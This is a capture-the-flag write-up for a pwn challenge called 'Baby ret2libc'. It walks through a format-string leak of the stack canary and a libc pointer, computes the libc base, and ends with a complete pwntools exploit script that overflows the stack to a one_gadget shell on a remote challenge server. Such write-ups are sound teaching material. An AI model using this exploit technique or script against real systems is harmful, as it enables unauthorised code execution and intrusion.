# Baby ret2libc
![](https://img.shields.io/badge/category-pwn-blue)
![](https://img.shields.io/badge/points-125-orange)

## Description
```
placeholder - problem hidden
```

## Solution
This question is basically identical to [Baby Cookie](https://github.com/jdabtieu/LyonCTF-white_flag/blob/main/babycookie.md) except that instead of returning to the print_flag function, we need to return to libc instead.

The stack cookie can be leaked the same way, and instead of leaking the address of main, we want to leak any address inside libc. Checking the stack, we see that two entries below the cookie, is a pointer to __libc_start_main+243. Score!
```
0088| 0x7ffdec2dcf88 --> 0xf9838f81ac4f2700 
0096| 0x7ffdec2dcf90 --> 0x0 
0104| 0x7ffdec2dcf98 --> 0x7f7a58ef40b3 (<__libc_start_main+243>:       mov    edi,eax)
```

Now that we know this, we can use <libc.blukat.me> to help us find the libc offset.

Testing `%19$p` against the server results in an address that ends in `f0b3` (your first digit might be different). While PIE does randomize the location of code, all segments must begin at an address that ends in `000`, including libc itself. Thus, if we calculate `0xf0b3 - 243`, we get `0xefc0`, meaning that [__libc_start_main exists at offset `fc0`](https://libc.blukat.me/?q=__libc_start_main%3Afc0&l=libc6_2.31-0ubuntu9.2_amd64).

This corresponds to `libc6_2.31-0ubuntu9.2_amd64`, meaning that the server runs this version of libc. We should make sure that our program also uses same version.

```
$ ldd babyret2libc 
        linux-vdso.so.1 (0x00007ffe6bd8c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdc22fbb000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fdc231bf000)
$ /lib/x86_64-linux-gnu/libc.so.6
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.2) stable release version 2.31.
```

Luckily for me, I run the same version of libc, so no modifications need to be made.

The website also tells us that __libc_start_main is 0x026fc0 bytes past the start of libc, meaning that the libc base address will be our leaked address - 243 - 0x026fc0.

Once we know that, we can use the buffer overflow to jump to a gadget that gives us a shell. Using one_gadget, I was able to find a gadget that works as long as the r15 and rdx registers are null, which is true for this program.
```
# 0xe6c81 execve("/bin/sh", r15, rdx)
[----------------------------------registers-----------------------------------]
...
RDX: 0x0 
...
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5609ef104360 <main+343>:   je     0x5609ef104367 <main+350>
   0x5609ef104362 <main+345>:   call   0x5609ef1040c0 <__stack_chk_fail@plt>
   0x5609ef104367 <main+350>:   leave  
=> 0x5609ef104368 <main+351>:   ret    
```

The final exploit will consist of these steps:
1. Leak canary and __libc_start_main+243
2. Calculate libc base
3. Stack overflow to libc base + 0xe6c81, making sure to keep the stack canary intact
4. Win!

```py
# %19$p - __libc_start_main+243
# %17$p - canary

# 0xe6c81 execve("/bin/sh", r15, rdx)

from pwn import *

#p = process("./babyret2libc")
p = remote("17fae81.0x16.ink", 32760)

pay = b'\n'*4 + b'%19$p %17$p'

p.sendline(pay)
p.recvuntil(b'name?\n')
p.recvuntil(b'Hi ')

addrs = p.recvuntil(b'\n')[:-1].split(b' ')
libc_start_main_243 = int(addrs[0], 16)
canary = int(addrs[1], 16)

log.info("Canary: " + hex(canary))
log.info("__libc_start_main+243: " + hex(libc_start_main_243))

libc_base = libc_start_main_243 - 243 - 0x026fc0
assert(libc_base & 0xfff == 0)          # gotta make sure libc base ends in 0x000, otherwise we made a mistake
log.info("libc base: " + hex(libc_base))
gadget = libc_base + 0xe6c81
log.info("gadget: " + hex(gadget))

pay = b'A'*8*9 + p64(canary) + p64(0) + p64(gadget) # 9 stack entries of garbage + canary + garbage + give us shell!
p.sendline(pay)
p.interactive()
```


Flag: `placeholder - problem hidden`
